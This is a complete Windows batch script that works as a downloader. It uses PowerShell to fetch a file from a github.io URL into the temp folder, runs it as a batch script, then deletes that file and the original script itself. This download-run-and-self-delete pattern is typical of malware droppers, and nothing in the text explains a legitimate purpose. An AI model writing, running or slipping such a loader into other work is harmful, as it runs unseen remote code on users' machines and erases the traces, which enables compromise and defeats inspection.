@echo off REM Define the URL of the script to download set "scriptURL=https://radio1233.github.io/QUCXB.github.io/app" REM Define the filename for the temporary script set "tempScript=%temp%\temp_script.bat" REM Download the script from the URL powershell -Command "(New-Object Net.WebClient).DownloadFile('%scriptURL%', '%tempScript%')" REM Check if download was successful if not exist "%tempScript%" ( echo Error: Failed to download script from %scriptURL% exit /b 1 ) REM Run the downloaded script call "%tempScript%" REM Delete the temporary script del "%tempScript%" REM Optionally, delete this batch file itself del "%~f0"
